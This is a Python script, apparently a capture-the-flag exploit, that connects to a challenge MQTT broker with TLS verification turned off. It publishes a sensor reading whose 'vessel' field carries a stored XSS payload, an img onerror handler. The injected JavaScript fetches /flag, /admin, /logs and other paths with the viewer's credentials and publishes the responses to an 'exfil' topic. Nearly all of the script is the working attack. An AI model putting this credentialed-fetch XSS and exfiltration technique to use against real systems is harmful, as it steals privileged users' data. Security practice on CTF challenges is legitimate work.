import json
import time
import ssl
import paho.mqtt.client as mqtt

BROKER = "mqtt-ws-01kz19s89wrj5sjmrfh8pdws3y.u-ctf-ctf-7001b39a.urc.tf"
PORT = 443

PUB_TOPIC = "arachne/cargo/pwn/reading"
SUB_TOPIC = "arachne/cargo/+/reading"
EXFIL_TOPIC = "arachne/cargo/exfil/reading"

flag_hits = []

def on_connect(client, userdata, flags, rc, properties=None):
    print("[+] connected:", rc)
    client.subscribe(SUB_TOPIC)
    print("[+] subscribed:", SUB_TOPIC)

    js = r"""
(async()=>{
 let o='';
 for (let u of ['/flag','/flag.txt','/admin','/logs','/api/flag','/api/logs','/debug','/status']) {
   try {
     let r = await fetch(u,{credentials:'include'});
     o += u+' '+r.status+'\n'+(await r.text()).slice(0,1200)+'\n---\n';
   } catch(e) {
     o += u+' ERR '+e+'\n---\n';
   }
 }
 client.publish('arachne/cargo/exfil/reading', JSON.stringify({
   vessel:o,
   status:'exfil',
   temp:0,
   pressure:0
 }));
})()
""".replace("\n", "")

    payload = {
        "vessel": f'<template><img src=x onerror="{js}"></template>',
        "status": "nominal",
        "temp": "21",
        "pressure": "1013",
    }

    client.publish(PUB_TOPIC, json.dumps(payload))
    print("[+] XSS payload published to", PUB_TOPIC)
    print("[+] waiting for admin/exfil messages...")

def on_message(client, userdata, msg):
    try:
        text = msg.payload.decode(errors="ignore")
    except Exception:
        text = repr(msg.payload)

    if msg.topic == PUB_TOPIC:
        return

    print("\n--- MESSAGE", msg.topic, "---")
    print(text[:2500])

    if "uctf{" in text or "flag{" in text:
        flag_hits.append(text)

client = mqtt.Client(
    mqtt.CallbackAPIVersion.VERSION2,
    client_id="phantom-pwner",
    transport="websockets",
)

client.tls_set(cert_reqs=ssl.CERT_NONE)
client.tls_insecure_set(True)
client.ws_set_options(path="/mqtt")

client.on_connect = on_connect
client.on_message = on_message

client.connect(BROKER, PORT, keepalive=60)
client.loop_start()

for _ in range(90):
    if flag_hits:
        break
    time.sleep(1)

client.loop_stop()
client.disconnect()

print("\n[+] done")
if flag_hits:
    print("[+] possible flag found above")
else:
    print("[-] no flag yet; send me the printed messages/errors")
